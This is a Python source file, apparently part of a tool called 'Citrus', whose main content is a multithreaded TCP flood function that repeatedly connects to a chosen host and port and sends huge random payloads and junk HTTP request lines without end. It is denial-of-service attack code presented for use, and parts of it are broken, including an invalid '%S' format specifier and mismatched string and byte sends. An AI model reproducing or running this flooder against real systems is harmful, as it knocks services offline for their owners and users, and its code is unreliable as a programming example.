
#                                  Citrus v 2.0.1                   

#            Copyright (C) 2020, ZEN project. All Rights Reserved.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import socket
import random
import threading
import sys, os , time


def TCP(threads, host, port, mode):


    print("\n[-] Flooding << HOST: %s PORT: %s METHOD: %s >> with %s threads"%(host,port,mode,threads))
    time.sleep(5)

    def tcpFlood():

    # The main function of this function is 
    # to make a while loop statement and send
    # infinite packets to the target host
        try:
            sent = 0 # this will be our variable that defines how many packet are sent
            while True: # While statement it will run infinitely while program is running

                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create socket
                    sock.connect((host, port)) # connect to target host,port


                except socket.error as e:
                    print("[-] Cannot create a TCP connection")
                    print(e)

                # We will create a packet and send it
                try:
                    for _ in range(6000):
                        packet = random._urandom(random.randint(1,200000000))
                        data = str("GET /? HTTP/1.1\r\nAccept-language: en-US,en,q=0.5".encode('utf-8'))

                        sock.send("{}\r\n".format(data).encode("utf-8"))

                        sock.send(packet) # send packet to the connected host
                        sock.send(data) # send packet to the connected host



                except Exception as e:
                    print(f"[-] {e}")
                    time.sleep(.1)
                    continue



                else:

                    sent += 1
                    print("[-] Flooding <<HOST: %s PORT: %s METHOD: %S >> with %s packets"%(host, port, mode, sent))
                
        except KeyboardInterrupt:

            print("[-] Operation canceled")
            sys.exit()
            
    thread_list = []
    for thread in range(threads):
        t = threading.Thread(target=tcpFlood)
        t.start()
        thread_list.append(t)
    
    for i in thread_list:
        i.join()

        
